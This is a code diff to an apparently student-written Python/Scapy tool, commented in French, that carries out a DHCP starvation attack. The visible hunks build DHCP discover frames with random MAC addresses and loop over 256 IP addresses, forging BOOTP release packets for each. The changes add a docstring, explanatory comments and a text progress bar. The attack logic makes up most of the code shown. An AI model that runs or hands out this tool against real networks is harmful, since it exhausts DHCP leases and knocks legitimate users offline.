@@ -6,11 +6,16 @@ from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether
 from tqdm import tqdm
+import sys
 
 import utils
 
 # Fonction de l'attaque DHCP pour l'interface GUI
 def dhcp(interface,win,pg):
+    '''Cette fonction nous permet de lancer une attaque de type DHCP Starvation
+    interface -->str
+    win-->Tk
+    pg--> progressbar'''
     # Construction d'un paquet DHCP_DISCOVER à envoyer
     # Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
     frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
@@ -42,10 +47,10 @@ def dhcp(interface,win,pg):
         elif(liste[0]=="127"):
             print("L'adresse utilisée n'est pas disponible")
             return
-        liste = ip.split(".")
-        liste.pop(3)
-        str_vide = ""
-        new = ip_str + str_vide + "." + str(j)
+        liste = ip.split(".")#Séparation de l'ip en une liste
+        liste.pop(3)#Suppresion du dernier octets
+        str_vide = ""#Creation d'une chaine de caratère vide
+        new = ip_str + str_vide + "." + str(j)#Concaténation de l'ip avec le dernier octets qui change a chaque tour de boucle
         print("Attaque en cours sur l'IP " + new)
         pg.step(0.39) # Ajout de 0.39 à  la barre de progression
         win.update() # Mise a jour de la fenetre
@@ -88,19 +93,23 @@ def dhcp_no_gui(interface):
         else:
             ip_str = (ip_str + liste[i])
     # À chaque tour de boucle nous ajoutons "1" au dernier octet de l'IP puis nous reconstruisons l'IP avec les "." à partir de la liste
-    for i in tqdm(range(0, 100), desc="Progression"):
-        time.sleep(.1)
+    taille = 40
     for j in range(0, 256):
-        if(liste[0]=="0"):
+        if (liste[0] == "0"):
             print("L'adresse utilisée n'est pas disponible")
             return
-        elif(liste[0]=="127"):
+        elif (liste[0] == "127"):
             print("L'adresse utilisée n'est pas disponible")
             return
-        liste = ip.split(".")
-        liste.pop(3)
-        str_vide = ""
-        new = ip_str + str_vide + "." + str(j)
+        #Code de la barre réalisé par une intéligence artificielle
+        pourcentage = j / 256 # Porucentage actuelle de l'attaque
+        barre = int(taille * pourcentage) # Calcul de la partie non utilisé de la barre
+        jauge = f"[{'#' * barre}{'-' * (taille - barre)}] {int(pourcentage * 100)}%" #Creation de la barre avec l'utilisation d'un f string et modificaiton en fonction du pourcentage
+        sys.stdout.write('\r' + jauge+"\n") # Ecriture de la barre
+        liste = ip.split(".")  # Séparation de l'ip en une liste
+        liste.pop(3)  # Suppresion du dernier octets
+        str_vide = ""  # Creation d'une chaine de caratère vide
+        new = ip_str + str_vide + "." + str(j)  # Concaténation de l'ip avec le dernier octets qui change a chaque tour de boucle
         print("Attaque en cours sur l'IP " + new)
         # Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
         frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
